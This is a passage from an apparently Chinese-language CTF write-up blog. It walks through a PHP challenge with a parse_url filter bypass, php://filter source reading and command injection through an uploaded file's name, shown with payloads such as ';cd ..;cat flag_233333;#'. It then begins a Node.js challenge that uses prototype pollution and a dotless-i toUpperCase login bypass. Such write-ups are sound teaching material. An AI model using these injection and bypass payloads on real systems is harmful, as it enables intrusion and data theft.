class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateadmin</span>(<span class="params"><span class="variable">$level</span>,<span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="subst">$user</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">sql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//    die($res);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span> == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">Filter</span>(<span class="variable">$user</span>);</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="subst">$user</span>&#x27;,&#x27;<span class="subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">sql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mysqli</span>-&gt;insert_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR | E_WARNING | E_PARSE);</span><br><span class="line"><span class="title function_ invoke__">define</span>(BASEDIR, <span class="string">&quot;/var/www/html/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(FLAG_SIG, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$OPERATE</span> = <span class="keyword">array</span>(<span class="string">&#x27;userinfo&#x27;</span>,<span class="string">&#x27;upload&#x27;</span>,<span class="string">&#x27;search&#x27;</span>);</span><br><span class="line"><span class="variable">$OPERATE_admin</span> = <span class="keyword">array</span>(<span class="string">&#x27;userinfo&#x27;</span>,<span class="string">&#x27;upload&#x27;</span>,<span class="string">&#x27;search&#x27;</span>,<span class="string">&#x27;manage&#x27;</span>);</span><br><span class="line"><span class="variable">$DBHOST</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$DBUSER</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$DBPASS</span> = <span class="string">&quot;Nu1LCTF2018!@#qwe&quot;</span>;</span><br><span class="line"><span class="comment">//$DBPASS = &quot;&quot;;</span></span><br><span class="line"><span class="variable">$DBNAME</span> = <span class="string">&quot;N1CTF&quot;</span>;</span><br><span class="line"><span class="variable">$mysqli</span> = @<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$DBHOST</span>, <span class="variable">$DBUSER</span>, <span class="variable">$DBPASS</span>, <span class="variable">$DBNAME</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect_errno</span>())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no sql connection&quot;</span>.<span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">        <span class="variable">$mysqli</span>=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计一下没发现什么不对的 我以为是sql注入</p><p>但是看了wp 发现是我没学到的知识点</p><p>其他文件没有什么 直接来看重要的function.php</p><p>定位到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory_guest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>,<span class="string">&quot;info&quot;</span>];</span><br><span class="line">    <span class="variable">$uri</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$uri</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$token</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$k</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$v</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现存在parse_url解析漏洞</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742999096-b318c342-ce4a-475b-a82b-479e913e7f0b.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689743053375-32586548-cdef-45ab-9fd0-9d420a14c6b5.png" alt="img"></p><p>可以借助一个demo来理解</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689743421112-e924c505-196c-450c-8811-58f86831aa55.png" alt="img"></p><p> parse_url()会把<code>//</code>认为是相对路径 </p><p>于是当我们在路径前多输入一个&#x2F;，会使这个函数失效，这样就绕过了检测  </p><p>如果我们直接输入<code>/user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg</code>会被检测</p><p>但是在前面多加一个<code>/</code>成功读到了源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg</span><br><span class="line">&lt;?php</span><br><span class="line">if (FLAG_SIG != 1)&#123;</span><br><span class="line">    die(&quot;you can not visit it directly&quot;);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    echo &quot;you can find sth in m4aaannngggeee&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>利用伪协议读源码 </p><p>然后得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can not visit it directly&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;templates/upload.html&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>/templates/upload.html</code></p><p>但是是个假的上传点</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742013537-59d3d70f-8100-4372-a4d1-ffb424e4e727.png" alt="img"></p><p>随便上传一个文件之后会报错并且发现存在<code>/upllloadddd.php</code></p><p>然后利用前面的伪协议获取源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$allowtype</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line"><span class="variable">$size</span> = <span class="number">10000000</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error:not an upload file！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newfile</span> = <span class="variable">$path</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;file upload success&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$picdata</span> = <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot; | base64 -w 0&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="variable">$picdata</span>.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload file error: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">array_pop</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$allowtype</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接定位到这一行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);</span><br></pre></td></tr></table></figure><p>发现存在文件上传名漏洞 可以修改文件名闭合命令执行</p><p>但是真正的上传点在哪呢 看了wp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user.php?page=m4aaannngggeee</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742213512-efa5426d-7232-415f-bca5-7372374dc56a.png" alt="img"></p><p>由于不能让move_uploaded_file报错，文件名里不能有&#x2F;这种路径字符  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_">is_uploaded_file</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_">move_uploaded_file</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$path.<span class="property">$filename</span>))&#123;</span><br><span class="line">        <span class="title function_">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以如果我们执行命令 <code>ls /</code>这样 那么就会die出去 没有回显 难怪我一开始一直在这里困惑 </p><p>翻别人的博客看wp真是一件美事啊:)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cd ..;ls;#</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689741475222-474413c2-512d-4fdc-9496-c77c237cf241.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cd ..;cat flag_233333;#</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689741512376-6e560d1f-9068-48c5-a07b-73a7ed625bb8.png" alt="img"></p><h1 id="118、-强网杯-2019-Upload"><a href="#118、-强网杯-2019-Upload" class="headerlink" title="118、[强网杯 2019]Upload"></a>118、[强网杯 2019]Upload</h1><p>又要代码审计先留着</p><h1 id="119、-GYCTF2020-Ez-Express"><a href="#119、-GYCTF2020-Ez-Express" class="headerlink" title="119、[GYCTF2020]Ez_Express"></a>119、[GYCTF2020]Ez_Express</h1><p>一道js的原型链污染+ssti的组合题目 挺不错的</p><p>首先访问主页 他让我们用ADMIN 登录 然后存在一个源码泄露 </p><p><code>/www.zip</code>下到源码</p><p>放一下重要的源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">    <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="property">outputFunctionName</span>=<span class="literal">undefined</span>;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>))&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>)&#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/info&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.<span class="property">outputFunctionName</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>看到了我们的老朋友 merge() 呢就肯定存在原型链污染</p><p>顺着看逻辑 首先是登陆</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>))&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>)&#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>&#39;user&#39;:req.body.userid.toUpperCase()</code>这里存在一个把我们名字转为大写的操作</p><p>其实考了javascript大小写特性</p><p>在js中 有一种类字符 比如<code>admın</code>看起来像我们平常的admin 但是他的<code>ı</code>字符并不是我们常用的i 但是经过这个toUpperCase()函数之后 就会变为大写的<code>I</code> 那么就可以bypass了 当然也会存在转小写的操作 都是一个思路</p><p>参考：<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p><p>注册<code>admın</code> 